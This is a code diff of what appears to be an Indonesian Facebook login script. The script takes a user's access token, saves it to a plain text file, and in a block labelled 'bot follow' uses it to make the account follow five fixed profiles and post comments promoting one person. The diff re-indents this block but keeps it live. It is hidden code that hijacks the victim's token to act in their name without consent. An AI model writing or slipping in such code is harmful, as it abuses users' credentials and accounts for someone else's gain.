@@ -79,15 +79,15 @@ def masuk():
             gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
             print ('\n%s[√] Login berhasil, mohon tunggu '%(H));jeda(2)
             open('token.txt', 'w').write(romz);login_xx()
-        # -> bot follow
-        requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      
-        requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      
-        requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      
-        requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)      
-        requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)
-        requests.post("https://graph.facebook.com/4257706904267068/comments?message=krend Bang !&access_token="+token)
-        requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
-        requests.post("https://graph.facebook.com/3882176535153442/comments/?message=Moga Langgeng Aa Raka Sama Tth Manda Nya :) !&access_token="+token)
+            # -> bot follow
+            requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      
+            requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      
+            requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      
+            requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)      
+            requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)
+            requests.post("https://graph.facebook.com/4257706904267068/comments?message=krend Bang !&access_token="+token)
+            requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia !&access_token="+token)
+            requests.post("https://graph.facebook.com/3882176535153442/comments/?message=Moga Langgeng Aa Raka Sama Tth Manda Nya :) !&access_token="+token)
         except (KeyError,IOError):
         	print("%s [!] Token invalid "%(M));masuk()
     elif rom in ('2', '02'):
